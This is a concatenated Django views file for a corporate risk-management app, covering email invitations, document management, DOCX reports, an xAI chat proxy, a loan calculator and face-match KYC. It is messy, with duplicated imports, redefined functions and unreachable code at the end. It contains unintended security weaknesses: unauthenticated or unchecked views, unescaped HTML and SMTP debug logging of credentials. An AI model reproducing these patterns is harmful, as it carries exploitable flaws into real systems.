from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from datetime import datetime
from django.conf import settings


def send_email(subject, message, recipient_list):
    try:
        smtp_settings = SMTPSetting.objects.first()
        if not smtp_settings:
            logging.error("SMTP settings are not configured.")
            return

        msg = MIMEMultipart("related")  # ✅ Ensure inline embedding works correctly
        msg['From'] = smtp_settings.sender_email
        msg['To'] = ', '.join(recipient_list)
        msg['Subject'] = subject

        # ✅ FIX: Use the correct relative path from Django's static folder
        signature_path = os.path.join("orm", "static", "images", "email_signature.png")

        # ✅ Debugging Log: Check the Path
        logging.info(f"Checking signature path: {signature_path}")

        # ✅ Ensure the file exists before attaching
        if not os.path.exists(signature_path):
            logging.error(f"❌ Email signature image not found: {signature_path}")
            return  # Stop execution if the image is missing

        # ✅ Add the Date header (Fix for Outlook Sent Date)
        msg['Date'] = datetime.utcnow().strftime("%a, %d %b %Y %H:%M:%S +0000")  # RFC 2822 format

        # ✅ Create the HTML email part
        html_body = f"""
        <html>
        <body>
            {message}
            <p>
                <img src="cid:signature" alt="Email Signature" style="max-width:400px;"/>
            </p>
        </body>
        </html>
        """
        html_part = MIMEText(html_body, "html")
        msg.attach(html_part)  # ✅ Attach the HTML content first

        # ✅ Attach the Email Signature Image as Inline
        with open(signature_path, "rb") as img_file:
            img = MIMEImage(img_file.read(), _subtype="png")
            img.add_header("Content-ID", "<signature>")  # Matches the 'cid:signature' in the HTML body
            img.add_header("Content-Disposition", "inline")  # ✅ Ensures the image is NOT an attachment
            img.add_header("Content-Transfer-Encoding", "base64")
            msg.attach(img)

        # ✅ SMTP server configuration
        smtp_host = smtp_settings.smtp_server
        smtp_port = smtp_settings.smtp_port
        smtp_user = smtp_settings.smtp_username
        smtp_password = smtp_settings.smtp_password

        # Encode username and password in Base64
        encoded_user = base64.b64encode(smtp_user.encode()).decode()
        encoded_password = base64.b64encode(smtp_password.encode()).decode()

        # ✅ Connect to the SMTP server
        server = smtplib.SMTP(smtp_host, smtp_port)
        server.set_debuglevel(1)  # Enable debug output
        server.ehlo()
        server.starttls()  # Secure the connection
        server.ehlo()

        # Perform AUTH LOGIN manually
        server.docmd("AUTH LOGIN", encoded_user)
        server.docmd(encoded_password)

        # ✅ Send the email
        server.sendmail(msg['From'], recipient_list, msg.as_string())
        server.quit()

        logging.info(f"✅ Email sent successfully to {', '.join(recipient_list)}")

    except smtplib.SMTPException as e:
        logging.error(f"❌ Failed to send email: {e}")

    except Exception as e:
        logging.error(f"❌ Unexpected Error: {e}")

from django.shortcuts import render, redirect
from django.contrib.auth.models import User
from .forms import EmailForm
from django.shortcuts import render, redirect
from django.contrib.auth.models import User
from .forms import EmailForm

from django.shortcuts import render
from django.contrib.auth.decorators import login_required
from django.utils.timezone import now
from .models import SMTPSetting
from .forms import EmailForm

from django.shortcuts import render
from django.utils.timezone import now
from .models import EmailLog, SMTPSetting
from .forms import EmailForm

from django.shortcuts import render
from django.utils.timezone import now
from .models import EmailLog, SMTPSetting
from .forms import EmailForm

from django.shortcuts import render
from django.utils.timezone import now
from .models import EmailLog, SMTPSetting
from .forms import EmailForm

from django.shortcuts import render
from django.utils.timezone import now
from django.contrib import messages
from django.urls import reverse
from .models import EmailLog, SMTPSetting
import logging

from django.shortcuts import render
from django.utils.timezone import now
from django.urls import reverse
from .models import EmailLog, SMTPSetting
import logging

from django.shortcuts import render, get_object_or_404, redirect
from django.contrib import messages
from django.utils.timezone import now
from django.urls import reverse
import logging
from .models import EmailLog, SMTPSetting

def generate_email_view(request):
    """
    Generates and sends a single risk assessment invitation email.
    """
    if request.method == "POST":
        form = EmailForm(request.POST)
        if form.is_valid():
            user = form.cleaned_data["users"]  # ✅ Directly use the single user object
            portfolios = ", ".join([p.name for p in form.cleaned_data["portfolios"]])
            response_deadline = form.cleaned_data["response_deadline"].strftime("%d/%m/%Y")

            sender_name = request.user.get_full_name()
            sender_email = request.user.email
            company = "AVAX SA"

            email_subject = f"Πρόσκληση σε Συνεδρίαση Αξιολόγησης Κινδύνων – {company}"

            # ✅ Create a single log entry for the user
            email_log = EmailLog.objects.create(
                recipient_email=user.email,
                subject=email_subject,
                body="",
                sent_at=now(),
                response_received=False
            )

            # ✅ Generate the response tracking link
            response_link = request.build_absolute_uri(reverse('email-response', args=[email_log.id]))

            # ✅ Construct the email body
            email_body = f"""
<html>
<body>
    

    <p>Αγαπητέ/ή Κύριε/Κυρία {user.last_name},</p>
    <p>Σας προσκαλούμε εσάς ή/και τους συνεργάτες σας σε συνεδρίαση αξιολόγησης κινδύνων για τα χαρτοφυλάκια <strong>{portfolios}</strong>.</p>
    
    <p>Αυτή η συνεδρίαση είναι μια ευκαιρία να εξετάσουμε την τρέχουσα κατάσταση, να αναλύσουμε τα σκορ κινδύνου, και να συζητήσουμε πιθανές βελτιώσεις.</p>

    <p> Για περισσότερες πληροφορίες, μπορείτε να επισκεφθείτε την πλατφόρμα <a href="http://ermapp.avax.gr">ermapp.avax.gr</a>.</p>
    <p>(username: youremailaddress@avax.gr)</p>

  <p>Παρακαλούμε επιβεβαιώστε τη συμμετοχή σας και δηλώστε τη διαθεσιμότητά σας έως <strong>{response_deadline}</strong>, χρησιμοποιώντας τον παρακάτω σύνδεσμο:</p>
<p>
    <a href="{response_link}" style="display:inline-block; background-color:#007bff; 
    color:white; padding:10px; text-decoration:none; font-weight:bold;">
    ✅ Επιβεβαίωση Συμμετοχής & Διαθεσιμότητας
    </a>
</p>



</body>
</html>
"""

            





            # ✅ Update the email log with the actual body
            email_log.body = email_body
            email_log.save()

            # ✅ Send the email
            try:
                send_email(email_subject, email_body, [user.email])
                logging.info(f"✅ Email sent to {user.email}")
            except Exception as e:
                logging.error(f"❌ Failed to send email to {user.email}: {e}")

            return redirect("email_tracking_dashboard")

    else:
        form = EmailForm()

    return render(request, "email_form.html", {"form": form})

from datetime import datetime

from django.shortcuts import render, get_object_or_404, redirect
from django.contrib import messages
from django.utils.timezone import now
from datetime import datetime
from django.urls import reverse
from .models import EmailLog, SMTPSetting
import logging

from django.shortcuts import render, get_object_or_404, redirect
from django.contrib import messages
from django.utils.timezone import now
from datetime import datetime
from django.urls import reverse
import logging
from .models import EmailLog, SMTPSetting
from datetime import datetime

def email_response_view(request, email_id):
    """
    Handles user response, links it to the original email, and notifies both user & admin.
    """
    print(f"🔹 Processing response for email ID: {email_id}")

    email_log = get_object_or_404(EmailLog, id=email_id)
    print(f"📌 Found original email log for: {email_log.recipient_email}")

    if request.method == "POST":
        print("✅ Received POST request for response submission.")

        response_date = request.POST.get("response_date")
        meeting_time = request.POST.get("meeting_time")
        location = request.POST.get("location")  # ✅ Capture location input

        print(f"📆 Selected Date: {response_date}, ⏰ Selected Time: {meeting_time}, 📍 Location: {location}")

        # ✅ Ensure all required fields are provided
        if not response_date or not meeting_time or not location:
            messages.error(request, "Παρακαλώ επιλέξτε ημερομηνία, ώρα και τοποθεσία.")
            print("❌ Missing date, time, or location. Redirecting back.")
            return redirect(reverse("email-response", args=[email_id]))

        # ✅ Convert date & time to a single datetime field
        try:
            response_datetime = datetime.strptime(f"{response_date} {meeting_time}", "%Y-%m-%d %H:%M")
            print(f"✅ Formatted Response Datetime: {response_datetime}")
        except ValueError:
            messages.error(request, "Λανθασμένη μορφή ημερομηνίας/ώρας.")
            print("❌ Invalid date/time format. Redirecting back.")
            return redirect(reverse("email-response", args=[email_id]))

        # ✅ Save Response and ensure it is linked to the original email
        email_log.response_received = True
        email_log.response_at = now()
        email_log.user_selected_date = response_datetime  # Store full datetime
        email_log.location = location  # ✅ Store location
        email_log.save()

        print(f"✅ Response saved: {response_datetime}, 📍 Location: {location}")

        messages.success(request, "Η συμμετοχή σας επιβεβαιώθηκε επιτυχώς!")

        # ✅ Notify Admin & User
        smtp_settings = SMTPSetting.objects.first()
        admin_email = smtp_settings.admin_email if smtp_settings else None
        user_email = email_log.recipient_email

        subject = f"Επιβεβαίωση Συμμετοχής: {user_email}"

        # Format the response date to DD/MM/YYYY
        formatted_response_date = datetime.strptime(response_date, "%Y-%m-%d").strftime("%d/%m/%Y")

        body = f"""
            <html>
            <body style="font-family: Arial, sans-serif; line-height: 1.6; color: #333;">
                <p><strong>Αγαπητέ/ή Κύριε/Κυρία {user_email},</strong></p>
                <p>Ευχαριστούμε για την απάντησή σας! Επιβεβαιώσατε τη συμμετοχή σας για:</p>
                <p><strong>🗓 Ημερομηνία:</strong> {formatted_response_date}</p>
                <p><strong>⏰ Ώρα:</strong> {meeting_time}</p>
                <p><strong>📍 Τοποθεσία:</strong> {location}</p>
                <hr style="border: 1px solid #007bff; margin: 20px 0;">
                <p style="font-size: 14px; color: #555;">
                    <strong>Με εκτίμηση,</strong><br>
                  
                </p>
            </body>
            </html>
        """



        recipient_list = [user_email]  # Send confirmation to user
        if admin_email:
            recipient_list.append(admin_email)  # Also notify admin

        print(f"📤 Sending confirmation email to: {recipient_list}")

        try:
            send_email(subject, body, recipient_list)
            print("✅ Email successfully sent.")
        except Exception as e:
            logging.error(f"❌ Failed to send response confirmation email: {e}")
            print(f"❌ Email sending error: {e}")

        return redirect("/")

    print("🔹 Rendering response form.")
    return render(request, "email_response.html", {"email_log": email_log})

# =================================================================       
from django.shortcuts import (
    render, 
    get_object_or_404, 
    redirect
)
from django.contrib.auth.decorators import login_required
from django.db.models import Q
from django.http import JsonResponse

from .models import Folder, Portfolio, UserProfile
from .models import Document as MyDocument  # <-- Local model renamed
from .forms import FolderForm, DocumentForm

@login_required
def upload_document(request):
    if request.method == "POST":
        form = DocumentForm(request.POST, request.FILES)
        if form.is_valid():
            document = form.save(commit=False)
            document.uploaded_by = request.user
            # Ensure user has permission to upload to that portfolio
            if document.portfolio in request.user.userprofile.portfolios.all():
                document.save()
                return redirect('document_list')
            else:
                form.add_error('portfolio', "You don't have permission to upload to this portfolio.")
    else:
        form = DocumentForm()

    return render(request, 'documents/upload_document.html', {'form': form})

from django.contrib.auth.decorators import login_required
from django.shortcuts import render, get_object_or_404, redirect
from orm.models import Document, DocumentVersion  # Import both models
from orm.forms import DocumentForm
from django.contrib.auth.decorators import login_required
from django.shortcuts import render, get_object_or_404, redirect
from orm.models import Document, DocumentVersion
from orm.forms import DocumentForm

from django.contrib.auth.decorators import login_required
from django.shortcuts import render, get_object_or_404, redirect
from orm.models import Document, DocumentVersion
from orm.forms import DocumentForm

from django.contrib.auth.decorators import login_required
from django.shortcuts import render, get_object_or_404, redirect
from orm.models import Document, DocumentVersion  # Ensure these are imported
from orm.forms import DocumentForm

from django.contrib.auth.decorators import login_required
from django.shortcuts import render, get_object_or_404, redirect
from orm.models import Document, DocumentVersion
from orm.forms import DocumentForm

from django.contrib.auth.decorators import login_required
from django.shortcuts import render, get_object_or_404, redirect
from orm.models import Document as MyDocument, DocumentVersion  # Alias Document as MyDocument
from orm.forms import DocumentForm

@login_required
def edit_document(request, document_id):
    document = get_object_or_404(MyDocument, id=document_id)  # Use MyDocument, not Document or edit_document
    if request.method == "POST":
        form = DocumentForm(request.POST, request.FILES, instance=document)
        if form.is_valid():
            if 'file' in request.FILES:
                current_file = document.file
                version_number = document.versions.count() + 1
                DocumentVersion.objects.create(
                    document=document,
                    file=current_file,
                    version_number=version_number
                )
            form.save()
            return redirect('document_list')
    else:
        form = DocumentForm(instance=document)
    return render(request, 'documents/edit_document.html', {'form': form, 'document': document})

@login_required
def document_versions(request, document_id):
    document = get_object_or_404(MyDocument, id=document_id)
    versions = document.versions.all().order_by('-uploaded_at')
    return render(request, 'documents/document_versions.html', {
        'document': document, 
        'versions': versions
    })

@login_required
def create_folder(request):
    """ Create a new folder dynamically via AJAX request. """
    if request.method == "POST":
        folder_form = FolderForm(request.POST)
        if folder_form.is_valid():
            new_folder = folder_form.save(commit=False)
            new_folder.created_by = request.user
            new_folder.save()
            return redirect('document_list')
    
    # If it's a GET or invalid POST, just render the form
    folder_form = FolderForm()
    return render(request, 'documents/create_folder.html', {'folder_form': folder_form})

@login_required
def edit_folder(request, folder_id):
    """ Edit folder name """
    folder = get_object_or_404(Folder, id=folder_id)

    if request.method == "POST":
        new_name = request.POST.get("folder_name", "").strip()
        if new_name:
            folder.name = new_name
            folder.save()
            return redirect('document_list')
        else:
            return render(request, 'documents/edit_folder.html', {
                'folder': folder,
                'error': "Folder name cannot be empty!"
            })

    return render(request, 'documents/edit_folder.html', {'folder': folder})

def get_file_icon(file_name):
    """
    Returns the appropriate FontAwesome class 
    for the given file type
    """
    file_name = file_name.lower()

    if file_name.endswith('.pdf'):
        return "fas fa-file-pdf text-danger"
    elif file_name.endswith(('.doc', '.docx')):
        return "fas fa-file-word text-primary"
    elif file_name.endswith(('.xls', '.xlsx')):
        return "fas fa-file-excel text-success"
    elif file_name.endswith(('.ppt', '.pptx')):
        return "fas fa-file-powerpoint text-warning"
    elif file_name.endswith(('.zip', '.rar')):
        return "fas fa-file-archive text-secondary"
    elif file_name.endswith('.py'):
        return "fas fa-file-code text-success"
    else:
        return "fas fa-file"



# views.py
from django.contrib.auth.decorators import login_required
from django.shortcuts import render, redirect
from django.db.models import Q
from .models import Folder, Document as MyDocument, Portfolio, UserProfile  # Import Document as MyDocument
from .forms import FolderForm, DocumentForm

# views.py
from django.contrib.auth.decorators import login_required
from django.shortcuts import render, redirect
from django.db.models import Q
from .models import Folder, Document as MyDocument, Portfolio, UserProfile
from .forms import FolderForm, DocumentForm


# views.py
from django.contrib.auth.decorators import login_required
from django.shortcuts import render, redirect
from django.db.models import Q
from .models import Folder, Document as MyDocument, Portfolio, UserProfile
from .forms import FolderForm, DocumentForm

# views.py
from django.contrib.auth.decorators import login_required
from django.shortcuts import render, redirect
from django.db.models import Q
from .models import Folder, Document as MyDocument, Portfolio, UserProfile
from .forms import FolderForm, DocumentForm

@login_required
def document_list(request):
    """ Display folders, documents, handle uploads, and folder creation """
    selected_portfolio_id = request.GET.get('portfolio')
    sort_by = request.GET.get('sort', 'name')  # Default sort by folder name
    sort_order = request.GET.get('order', 'asc')  # Default ascending

    if request.user.is_superuser:
        folders = Folder.objects.all()
        documents = MyDocument.objects.all()
        portfolios = Portfolio.objects.all()
    else:
        user_profile = UserProfile.objects.filter(user=request.user).first()
        if user_profile:
            user_portfolios = user_profile.portfolios.all()
            documents = MyDocument.objects.filter(portfolio__in=user_portfolios)
            folder_ids = documents.values_list('folder_id', flat=True)
            folders = Folder.objects.filter(
                Q(id__in=folder_ids) | Q(parent__in=folder_ids)
            ).distinct()
            portfolios = Portfolio.objects.filter(
                Q(id__in=user_portfolios.values_list('id', flat=True)) |
                Q(id__in=documents.values_list('portfolio_id', flat=True))
            ).distinct()
        else:
            folders = Folder.objects.none()
            documents = MyDocument.objects.none()
            portfolios = Portfolio.objects.none()

    # Only filter by portfolio_id if it’s a valid integer
    if selected_portfolio_id and selected_portfolio_id != 'None':
        try:
            selected_portfolio_id = int(selected_portfolio_id)
            documents = documents.filter(portfolio_id=selected_portfolio_id)
            folders = folders.filter(id__in=documents.values_list('folder_id', flat=True))
        except ValueError:
            pass

    # Apply sorting to folders
    if sort_by in ['name', 'created_at']:
        order_prefix = '-' if sort_order == 'desc' else ''
        folders = folders.order_by(f"{order_prefix}{sort_by}")

    # Assign file icons to documents
    for doc in documents:
        doc.icon_class = get_file_icon(doc.file.name)

    folder_form = FolderForm()
    doc_form = DocumentForm()

    if request.method == "POST":
        if "create_folder" in request.POST:
            folder_form = FolderForm(request.POST)
            if folder_form.is_valid():
                new_folder = folder_form.save(commit=False)
                new_folder.created_by = request.user
                new_folder.save()
                return redirect('document_list')
        if "upload_document" in request.POST:
            doc_form = DocumentForm(request.POST, request.FILES)
            if doc_form.is_valid():
                new_doc = doc_form.save(commit=False)
                new_doc.uploaded_by = request.user
                new_doc.save()
                return redirect('document_list')

    return render(request, 'documents/document_list.html', {
        'folders': folders,
        'documents': documents,
        'portfolios': portfolios.order_by('name'),
        'folder_form': folder_form,
        'doc_form': doc_form,
        'selected_portfolio_id': selected_portfolio_id,
        'sort_by': sort_by,
        'sort_order': sort_order,
    })

@login_required
def delete_folder(request, folder_id):
    """ Delete a folder and all its contents (subfolders & files) """
    folder = get_object_or_404(Folder, id=folder_id)

    # Check if the folder has any files or subfolders
    if folder.subfolders.exists() or MyDocument.objects.filter(folder=folder).exists():
        return JsonResponse({"error": "Cannot delete non-empty folder"}, status=400)

    folder.delete()
    return JsonResponse({"success": "Folder deleted successfully"})

@login_required
def delete_document(request, document_id):
    """ Delete a document """
    document = get_object_or_404(MyDocument, id=document_id)
    document.delete()
    return redirect('document_list')



# ============================= 


############################################
# views.py
############################################

import zipfile
from io import BytesIO

from django.http import HttpResponse
from django.shortcuts import render
from django.contrib.auth.decorators import permission_required
from django.db.models import Q
from docx import Document
from docx.shared import Pt

# We use html2docx but keep the original function name "mammoth_snippet_to_docx_document"
from html2docx import html2docx

from .models import Risk  # Adjust to wherever your Risk model is

def mammoth_snippet_to_docx_document(html_snippet: str) -> Document:
    """
    Despite the name, this function uses html2docx internally to convert HTML into 
    a python-docx Document. The docx is returned as a BytesIO, so we extract the 
    raw bytes to feed into Document().
    """
    # 1) Convert HTML to a BytesIO docx stream (including the 'title' param)
    docx_io = html2docx(html_snippet or "", title="Snippet")

    # 2) Extract raw bytes from docx_io
    docx_data = docx_io.getvalue()

    # 3) Parse those bytes into a python-docx Document
    snippet_doc = Document(BytesIO(docx_data))
    return snippet_doc

def append_docx_to_paragraph(snippet_doc: Document, paragraph):
    """
    Merges paragraphs/runs from snippet_doc into a single paragraph in the main 
    doc, preserving basic styling (bold, italic, underline, font size/name).
    """
    for i, snippet_paragraph in enumerate(snippet_doc.paragraphs):
        # Insert a newline before subsequent snippet paragraphs
        if i > 0:
            paragraph.add_run('\n')

        # Copy runs from snippet_paragraph
        for run in snippet_paragraph.runs:
            new_run = paragraph.add_run(run.text)
            # replicate basic styling
            new_run.bold = run.bold
            new_run.italic = run.italic
            new_run.underline = run.underline
            if run.font.size:
                new_run.font.size = run.font.size
            if run.font.name:
                new_run.font.name = run.font.name

@permission_required('orm.can_view_reports', raise_exception=True)
def generate_mammoth_risks_report(request):
    """
    A brand-new view that:
      1) Reads selected Risk objects from the DB via POST.
      2) For each risk, merges 'title' and 'description' HTML fields into 
         the final doc, using mammoth_snippet_to_docx_document (which 
         actually uses html2docx).
      3) Packages the result docx in a zip for download.
      4) Leaves your original generate_project_risk_report unaffected.
    """
    if request.method == "POST":
        selected_risk_ids = request.POST.getlist('risks')
        risks = Risk.objects.filter(id__in=selected_risk_ids)

        # Create the final doc in memory
        main_doc = Document()

        for risk in risks:
            # Example: heading for each risk
            main_doc.add_heading(f"Risk ID: {risk.id} (Inherent Score: {risk.inherent_score()})", level=2)

            # Convert and merge the risk.title
            if risk.title:
                title_doc = mammoth_snippet_to_docx_document(risk.title)
                p_title = main_doc.add_paragraph("Title: ")
                append_docx_to_paragraph(title_doc, p_title)

            # Convert and merge the risk.description
            if risk.description:
                desc_doc = mammoth_snippet_to_docx_document(risk.description)
                p_desc = main_doc.add_paragraph("Description: ")
                append_docx_to_paragraph(desc_doc, p_desc)

            # Insert page break after each risk
            main_doc.add_page_break()

        # Zip the docx
        buffer = BytesIO()
        with zipfile.ZipFile(buffer, 'w') as zip_archive:
            doc_bytes = BytesIO()
            main_doc.save(doc_bytes)
            doc_bytes.seek(0)
            zip_archive.writestr("mammoth_risks_report.docx", doc_bytes.read())

        buffer.seek(0)
        response = HttpResponse(buffer, content_type='application/zip')
        response['Content-Disposition'] = 'attachment; filename="mammoth_risks_report.zip"'
        return response

    # If GET, display a form to let user pick which risks to include
    all_risks = Risk.objects.all().order_by('-id')
    return render(request, 'mammoth_risks_form.html', {'all_risks': all_risks})

import requests
from django.http import JsonResponse
from django.shortcuts import render
from django.utils.safestring import mark_safe




import openai
import re
from django.conf import settings
from dotenv import load_dotenv
from openai import OpenAI, OpenAIError, RateLimitError, Timeout
import os
import time

env_path = "/home/alexis/projects/ormproject/.env"
load_dotenv(env_path)

# Get API Key
api_key = os.getenv("XAI_API_KEY")
if not api_key:
    raise ValueError("❌ ERROR: XAI_API_KEY is not set. Please check your .env file.")





def chat_view(request):
    if request.method == 'POST':
        message = request.POST.get('message')
        if not message:
            return JsonResponse({'error': 'No message provided'}, status=400)

        # Prepare the payload for xAI API
        payload = {
            "messages": [
                {
                    "role": "system",
                    "content": "You are Grok, an AI assistant for AVAX S.A., a leading Greek construction company. Format responses in HTML with headings (h3), bullet points (ul/li), and Greek/English text as needed, styled like a professional document."
                },
                {"role": "user", "content": message}
            ],
            "model": "grok-2-latest",
            "stream": False,
            "temperature": 0
        }

        # Call the xAI API
        try:
            response = requests.post(
                settings.XAI_API_URL,
                headers={
                    'Content-Type': 'application/json',
                    'Authorization': f'Bearer {api_key}'
                },
                json=payload
            )
            response.raise_for_status()
            data = response.json()
            reply = data.get('choices', [{}])[0].get('message', {}).get('content', 'No response from API')
            # Ensure the reply is marked safe for HTML rendering
            return JsonResponse({'reply': mark_safe(reply)})
        except requests.exceptions.RequestException as e:
            return JsonResponse({'error': str(e)}, status=500)

    # For GET requests, render the chat page
    return render(request, 'chat/xchat.html')




# ========================  

from django.shortcuts import render

def calculate_loan(amount, interest_rate, period):
    """Calculate loan details with 2 decimals, comma thousands, period decimals."""
    monthly_rate = (float(interest_rate) / 100) / 12
    months = int(period)
    amount = float(amount)
    
    if monthly_rate == 0:
        installment = amount / months
    else:
        installment = amount * (monthly_rate * (1 + monthly_rate) ** months) / ((1 + monthly_rate) ** months - 1)
    
    balance = amount
    schedule = []
    total_payment = 0
    total_interest = 0
    total_capital = 0
    
    # Find max values for bar scaling
    max_payment = installment  # Payment is constant
    max_interest = 0
    max_capital = 0
    temp_balance = amount
    for month in range(1, months + 1):
        interest = temp_balance * monthly_rate
        capital = installment - interest
        temp_balance -= capital
        max_interest = max(max_interest, interest)
        max_capital = max(max_capital, capital)
    
    # Build schedule with percentages
    for month in range(1, months + 1):
        interest = balance * monthly_rate
        capital = installment - interest
        balance -= capital
        schedule.append({
            'month': month,
            'payment': f"{installment:,.2f}".replace(",", "X").replace(".", ",").replace("X", "."),
            'interest': f"{interest:,.2f}".replace(",", "X").replace(".", ",").replace("X", "."),
            'capital': f"{capital:,.2f}".replace(",", "X").replace(".", ",").replace("X", "."),
            'balance': f"{max(balance, 0):,.2f}".replace(",", "X").replace(".", ",").replace("X", "."),
            'payment_percent': (installment / max_payment) * 100 if max_payment > 0 else 0,
            'interest_percent': (interest / max_interest) * 100 if max_interest > 0 else 0,
            'capital_percent': (capital / max_capital) * 100 if max_capital > 0 else 0
        })
        total_payment += installment
        total_interest += interest
        total_capital += capital
    
    formatted_total_payment = f"{total_payment:,.2f}".replace(",", "X").replace(".", ",").replace("X", ".")
    formatted_total_interest = f"{total_interest:,.2f}".replace(",", "X").replace(".", ",").replace("X", ".")
    formatted_total_capital = f"{total_capital:,.2f}".replace(",", "X").replace(".", ",").replace("X", ".")
    
    return {
        'loan': f"€{amount:,.2f}".replace(",", "X").replace(".", ",").replace("X", ".") + f" at {interest_rate}% for {months} months",
        'installment': f"{installment:,.2f}".replace(",", "X").replace(".", ",").replace("X", "."),
        'schedule': schedule,
        'totals': {
            'payment': formatted_total_payment,
            'interest': formatted_total_interest,
            'capital': formatted_total_capital
        },
        'total_cost': total_payment
    }

def loan_checker_view(request):
    if request.method == "POST":
        amount1 = request.POST.get("amount1")
        interest_rate1 = request.POST.get("interest_rate1")
        period1 = request.POST.get("period1")
        amount1 = float(amount1.replace(".", "").replace(",", ".")) if amount1 else 0
        interest_rate1 = float(interest_rate1.replace(".", "").replace(",", ".")) if interest_rate1 else 0
        period1 = int(period1.replace(".", "").replace(",", ".")) if period1 else 0
        loan1_data = calculate_loan(amount1, interest_rate1, period1)
        
        amount2 = request.POST.get("amount2")
        interest_rate2 = request.POST.get("interest_rate2")
        period2 = request.POST.get("period2")
        loan2_data = None
        cost_delta = None
        cheaper_loan = None
        if amount2 and interest_rate2 and period2:
            amount2 = float(amount2.replace(".", "").replace(",", ".")) if amount2 else 0
            interest_rate2 = float(interest_rate2.replace(".", "").replace(",", ".")) if interest_rate2 else 0
            period2 = int(period2.replace(".", "").replace(",", ".")) if period2 else 0
            loan2_data = calculate_loan(amount2, interest_rate2, period2)
            max_cost = max(loan1_data['total_cost'], loan2_data['total_cost'])
            loan1_data['total_cost_percent'] = (loan1_data['total_cost'] / max_cost) * 100 if max_cost > 0 else 0
            loan2_data['total_cost_percent'] = (loan2_data['total_cost'] / max_cost) * 100 if max_cost > 0 else 0
            delta = loan2_data['total_cost'] - loan1_data['total_cost']
            cost_delta = f"{abs(delta):,.2f}".replace(",", "X").replace(".", ",").replace("X", ".")
            cheaper_loan = "Loan 1" if delta > 0 else "Loan 2" if delta < 0 else "Equal"
        
        context = {"loan1_data": loan1_data, "cost_delta": cost_delta, "cheaper_loan": cheaper_loan}
        if loan2_data:
            context["loan2_data"] = loan2_data
        return render(request, "loan_checker.html", context)
    
    return render(request, "loan_checker.html")



from django.shortcuts import render
from orm.models import Loan
from decimal import Decimal

def calculate_loan(amount, interest_rate, period):
    monthly_rate = (float(interest_rate) / 100) / 12
    months = int(period)
    amount = float(amount)
    
    if monthly_rate == 0:
        installment = amount / months
    else:
        installment = amount * (monthly_rate * (1 + monthly_rate) ** months) / ((1 + monthly_rate) ** months - 1)
    
    total_payment = installment * months
    total_interest = total_payment - amount
    
    return {
        'amount': f"{amount:,.2f}".replace(",", "X").replace(".", ",").replace("X", "."),
        'duration': months,
        'installment': f"{installment:,.2f}".replace(",", "X").replace(".", ",").replace("X", "."),
        'totals': {
            'payment': f"{total_payment:,.2f}".replace(",", "X").replace(".", ",").replace("X", "."),
            'interest': f"{total_interest:,.2f}".replace(",", "X").replace(".", ",").replace("X", ".")
        }
    }

def loan_checker_view(request):
    if not request.session.session_key:
        request.session.create()
    session_key = request.session.session_key
    
    if request.method == "POST":
        amount1 = request.POST.get("amount1")
        interest_rate1 = request.POST.get("interest_rate1")
        period1 = request.POST.get("period1")
        amount1_raw = float(amount1.replace(".", "").replace(",", ".")) if amount1 else 0
        interest_rate1_raw = float(interest_rate1.replace(".", "").replace(",", ".")) if interest_rate1 else 0
        period1_raw = int(period1.replace(".", "").replace(",", ".")) if period1 else 0
        loan1_data = calculate_loan(amount1_raw, interest_rate1_raw, period1_raw)
        
        if request.POST.get("save_loan1"):
            Loan.objects.create(
                user=request.user if request.user.is_authenticated else None,
                session_key=session_key if not request.user.is_authenticated else None,
                amount=Decimal(amount1_raw),
                interest_rate=Decimal(interest_rate1_raw),
                duration_months=period1_raw,
                name=f"Loan 1 - {amount1}"
            )
            print("Loan 1 saved")  # Debug
        
        amount2 = request.POST.get("amount2")
        interest_rate2 = request.POST.get("interest_rate2")
        period2 = request.POST.get("period2")
        loan2_data = None
        if amount2 and interest_rate2 and period2:
            amount2_raw = float(amount2.replace(".", "").replace(",", ".")) if amount2 else 0
            interest_rate2_raw = float(interest_rate2.replace(".", "").replace(",", ".")) if interest_rate2 else 0
            period2_raw = int(period2.replace(".", "").replace(",", ".")) if period2 else 0
            loan2_data = calculate_loan(amount2_raw, interest_rate2_raw, period2_raw)
            
            if request.POST.get("save_loan2"):
                Loan.objects.create(
                    user=request.user if request.user.is_authenticated else None,
                    session_key=session_key if not request.user.is_authenticated else None,
                    amount=Decimal(amount2_raw),
                    interest_rate=Decimal(interest_rate2_raw),
                    duration_months=period2_raw,
                    name=f"Loan 2 - {amount2}"
                )
                print("Loan 2 saved")  # Debug
        
        context = {"loan1_data": loan1_data, "loan2_data": loan2_data}
        return render(request, "loan_checker.html", context)
    
    return render(request, "loan_checker.html")



    # kyc/views.py
# orm/views.py
from django.shortcuts import render, redirect
from django.contrib.auth.decorators import login_required
from .models import KYCVerification
import face_recognition
from PIL import Image
import numpy as np
import pdf2image
import os

# orm/views.py
from django.shortcuts import render, redirect
from django.contrib.auth.decorators import login_required
from .models import KYCVerification
from deepface import DeepFace
import fitz  # PyMuPDF
import os

# orm/views.py
from django.shortcuts import render, redirect
from django.contrib.auth.decorators import login_required
from .models import KYCVerification
from deepface import DeepFace
import fitz  # PyMuPDF
import os

@login_required
def kyc_upload(request):
    if request.method == 'POST':
        id_photo = request.FILES.get('id_photo')
        selfie = request.FILES.get('selfie')
        
        if id_photo and selfie:
            kyc = KYCVerification(user=request.user, id_photo=id_photo, selfie=selfie)
            kyc.save()

            # Handle ID photo (PDF or image)
            id_file_path = kyc.id_photo.path
            if id_file_path.lower().endswith('.pdf'):
                doc = fitz.open(id_file_path)
                page = doc.load_page(0)  # First page
                pix = page.get_pixmap()
                id_image_path = id_file_path.replace('.pdf', '.jpg')
                pix.save(id_image_path)
                doc.close()
            else:
                id_image_path = id_file_path

            # Process selfie
            selfie_path = kyc.selfie.path
            
            try:
                # Verify faces with DeepFace
                result = DeepFace.verify(
                    img1_path=id_image_path,
                    img2_path=selfie_path,
                    model_name='ArcFace',
                    detector_backend='retinaface'
                )
                similarity_score = result['distance'] * 100  # Distance to percentage
                kyc.similarity_score = 100 - similarity_score  # Higher is better
                
                if kyc.similarity_score > 85:
                    kyc.status = 'approved'
                elif kyc.similarity_score < 60:
                    kyc.status = 'rejected'
                else:
                    kyc.status = 'manual_review'
            except Exception as e:
                kyc.status = 'rejected'
                print(f"Error during verification: {e}")
            
            # Clean up temporary image (if PDF)
            if id_file_path.lower().endswith('.pdf') and os.path.exists(id_image_path):
                os.remove(id_image_path)
            
            kyc.save()
            return render(request, 'kyc/result.html', {'kyc': kyc})
    
    return render(request, 'kyc/upload.html')
    if request.method == 'POST':
        id_photo = request.FILES.get('id_photo')
        selfie = request.FILES.get('selfie')
        
        if id_photo and selfie:
